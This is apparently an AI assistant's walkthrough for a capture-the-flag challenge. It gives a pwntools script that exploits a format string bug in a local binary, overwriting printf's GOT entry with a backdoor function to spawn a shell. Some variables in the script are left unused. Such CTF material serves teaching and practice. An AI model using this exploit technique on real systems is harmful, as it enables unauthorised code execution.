To solve this challenge using `pwntools`, we will exploit the format string vulnerability in the `printf(buf)` call. The goal is to overwrite the Global Offset Table (GOT) entry for a function (e.g., `printf`) with the address of the `backdoor` function. This will allow us to execute the `backdoor` function and spawn a shell.

Here are the steps and the corresponding code:

---

### Steps to Solve the Challenge

1. **Analyze the Binary**:
   - The binary is a 32-bit ELF with no stack canary, no PIE, and NX enabled.
   - The `backdoor` function is at address `0x0804859B`.
   - The `printf` function is vulnerable to a format string attack.

2. **Identify the Target**:
   - We will overwrite the GOT entry of `printf` (found at `0x0804a010`) with the address of `backdoor` (`0x0804859B`).

3. **Exploit the Format String Vulnerability**:
   - Use the format string vulnerability to write the `backdoor` address into the `printf` GOT entry.

4. **Trigger the Exploit**:
   - After overwriting the GOT entry, any call to `printf` will execute the `backdoor` function, giving us a shell.

5. **Write the Exploit Code**:
   - Use `pwntools` to automate the exploitation process.

### Exploit Code

```python
from pwn import *

# Set up the binary and context
binary = './fmt'
elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'

# Addresses
backdoor_addr = elf.symbols['backdoor']  # Address of backdoor function
printf_got = elf.got['printf']           # Address of printf GOT entry

# Start the process
p = process(binary)

# Receive the initial "gift" message
p.recvuntil("gift: ")
gift = p.recvline().strip()
log.info(f"Gift: {gift}")

# Format string payload to overwrite printf GOT entry
# We will write the address of backdoor (0x0804859B) into printf GOT (0x0804a010)
# Split the address into two parts: lower 2 bytes and higher 2 bytes
backdoor_low = backdoor_addr & 0xffff
backdoor_high = (backdoor_addr >> 16) & 0xffff

# Calculate the offsets for the format string
offset_low = 10  # Adjust based on the stack layout
offset_high = 11  # Adjust based on the stack layout

# Construct the payload
payload = fmtstr_payload(offset_low, {printf_got: backdoor_addr})

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
```

### Explanation of the Code

1. **Binary Setup**:
   - We load the binary using `pwntools` and extract the addresses of the `backdoor` function and the `printf` GOT entry.

2. **Format String Payload**:
   - The `fmtstr_payload` function from `pwntools` is used to generate the format string payload. It calculates the necessary writes to overwrite the `printf` GOT entry with the `backdoor` address.

3. **Send the Payload**:
   - The payload is sent to the binary, exploiting the format string vulnerability.

4. **Trigger the Exploit**:
   - After overwriting the GOT entry, any call to `printf` will execute the `backdoor` function, spawning a shell.

5. **Interact with the Shell**:
   - Once the shell is spawned, we can interact with it using `p.interactive()`.

### Notes

- The `fmtstr_payload` function automatically calculates the necessary format string to perform the write. If it doesn't work as expected, you may need to manually craft the format string.
- The offsets (`offset_low` and `offset_high`) depend on the stack layout. You can use tools like `gdb` or `pwndbg` to inspect the stack and determine the correct offsets.
- Test the exploit locally before trying it on the remote server (if applicable).

This code should work for the given challenge. If you encounter any issues, you may need to adjust the offsets or debug the binary further.
